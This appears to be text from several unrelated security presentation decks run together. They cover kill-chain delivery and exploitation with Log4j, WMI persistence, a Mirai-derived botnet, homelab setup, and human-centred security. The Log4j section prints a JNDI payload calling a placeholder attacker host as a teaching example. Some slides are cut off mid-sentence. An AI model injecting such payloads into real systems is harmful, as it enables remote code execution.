DELIVERY VS. EXPLOITATION
03 DELIVERY PHASE
Transmitting the Payload
An attacker enters the malicious payload into a target input field and
submits it across the network.
KEY Concept:
● No code execution has occured on the target host yet.
● We submit a malicious string via a form field perhaps.
LOG4J EXAMPLE: USER INPUT
Attacker types the JNDI string into a login field and clicks "Submit":
${jndi:ldap://attacker.com/Exploit}
// Transmitted to web server
04 EXPLOITATION PHASE
Vulnerability Execution
The application parses the malicious payload, triggering software
flaws to run arbitrary code.
KEY Concept:
● Target host processes the string via vulnerable library.
● Automated callback fetches & executes malicious code.
LOG4J EXAMPLE: CODE EXECUTION
Log4j logs the failed attempt (go figure!), and end up fetching remote
data that is executed on the host.
Log4j::parseJNDI() -> LDAP fetch
Payload_Exec::RemoteClassInit()

PERSISTENCE VIA WMI BINDINGS
Installation Phase // WMI Event Filters & Consumers
01 WMI ARCHITECTURE
Filter to Consumer Mechanisms
WMI Filter to Consumer Bindings are a good example of establishing
long-term persistence within the system installation phase.
CORE COMPONENTS:
WMI Filter: A query condition that the kernel continuously looks for
(e.g., system event triggers).
WMI Binding: The binding action that the kernel executes once the
filter criteria are satisfied.
KEY ADVANTAGE:
● Executes inside the kernel context without standard binary
drop files.
● Survives reboots

What Is Gayfemboy?

⚫ Packed using UPX (Ultimate Packer for eXecutables)
− Hides magic number to “10 F0 00 00”

What’s the Difference?
⚫ Mirai uses default creds and brute force
− Gayfemboy uses weak creds and a list of CVEs
⚫ Removed Mirai’s string table and used plaintext strings
− Prints out “we gone now\n” when finished running

Building your first homelab

Getting started
When starting a homelab, there are many things to consider
● Hardware? What will your homelab actually run on?
● Operating system?
● Software?
● How can you access your lab remotely?

Hardware
Any computer can support a basic homelab! It does
not have to be a super expensive server.
Some options include:
● An old laptop/computer
● Second hand computer (Thrift store, estate sale,
ebay)
● Mini PC (Intel Nuc)
If hardware is a barrier of entry, you could also get
started by simply using a virtual machine on your

Operating system
There are a couple operating systems to

recommend.

● Easy to use web interface
● Supports snapshots and rollbacks
● LOTS of tutorials and documentation
available online
● Large thriving community

Software
Welcome to the wonderful world of self hosting. This is the fun part!
Some good first projects to set up:
● Jellyfin - Media streaming service (Your own netflix!)
● Navidrome - Music streaming service (Your own spotify!)
● Immich - Video and photo management (Your own Google Photos!)
● Docmost - Web based markdown editor
● Nginx proxy manager - Easy to use reverse proxy manager
● Forgejo - Self hosted alternative to github
● Nextcloud - Content collaboration (microsoft 365/google drive)

We love tailscale
● Your new best friend
● Free and easy remote access for your lab
● It also grows with your homelab
● AVOIDS putting stuff on the public internet

Why having your homelab exposed to the public internet is bad
● Could be security flaws in your homelab design
● Bots crawl the web constantly and will automatically scan and try to identify
weak servers
● You (probably) can't patch fast enough to keep up with AI

Helper Scripts
● Helper scripts install an entire service
in one command
● They are a great way to get started
with a working service
● Eventually it can be better to move
away from them

● What are we protecting, from whom, and at what cost?
● Every control changes who can access a system and what its users can do.

● How do we shape the emerging field of human risk management?
The Security Question

Security has competing objectives
Confidentiality: prevent unwanted disclosure
Integrity: prevent unauthorized change
Availability: keep necessary functions accessible
Even for assets, perfect isolation is rarely useful.

People and systems

Necessary access creates risk
Networks accept traffic. Employees need permissions. Administrators
need privileged access.
People need relationships, communication, mobility, and participation.
A zero-access policy can be perfectly restrictive and profoundly
unsuccessful.

The trusted-access problem
Cybersecurity already understands that authorized users can misuse
privileges.
A partner, caregiver, employer, or platform can also hold legitimate
access that becomes coercive.
The difference is the consequences for human agency and safety.
A person in the architecture

Where the analogy breaks
The problem may be authorized access used outside its legitimate
purpose.
A server has an owner and an intended workload.
A person has rights, changing preferences, relationships, and a life
beyond the system's objectives.
A person cannot be treated as an asset whose exposure someone else
may simply minimize.

The shared security problem
For assets:
● A network must accept some traffic.
● Employees need permissions to work.
● Administrators need elevated access.
● Applications must expose interfaces.
● Trusted access can be abused.
● Controls introduce friction and new
failure modes.
● No individual control is perfect, so we
use defense in depth.
For people:
● People need relationships and
communication.
● They need to participate in public and
digital life.
● Family members and partners receive
legitimate access and trust.
● Trusted people can become coercive
or abusive.
● Isolation may reduce exposure but also
destroys utility, support and autonomy.
● No individual safeguard is perfect, so
human safety also requires layered
defenses.
Defense in depth for people?

A control can become a threat
Monitoring may detect harm but also expose private activity.
Restriction may prevent some contacts but cut off support.
Identity checks may reduce impersonation but create barriers or new
sensitive data.
Risk reduction must include the harms introduced by the control.
Surveillance and security

A product-design thought experiment
Imagine a safety feature that lets a trusted person monitor a teenager's
location.
Who grants access? Can the teenager see it? Can access be revoked?
What happens during family conflict?
The same feature can support care or facilitate coercive control.
Product design has consequences

Four questions for every safeguard
1. Whose threat model defines the problem?
2. Who gains access, power, or visibility?
3. How can a person understand, contest, or leave the control?
4. What happens when a trusted party becomes the threat?

Defense in depth for people
Technical security Human-centered equivalent
Authentication Control over identity and access
Least privilege Limited, contextual sharing
Segmentation Boundaries between relationships and domains
Logging Evidence preservation and understandable activity history
Anomaly detection Recognizing changes in behavior or access patterns
Incident response Safety planning and trusted assistance
Recovery Restoring accounts, resources, and autonomy
Redundancy Multiple trusted contacts and ways to obtain help
Defense in depth Technical, social, institutional, and physical safeguards

What counts as success?
Measure more than reduced incidents or blocked access.
Assess privacy, ability to seek help, false positives, unequal burdens,
and reversibility.
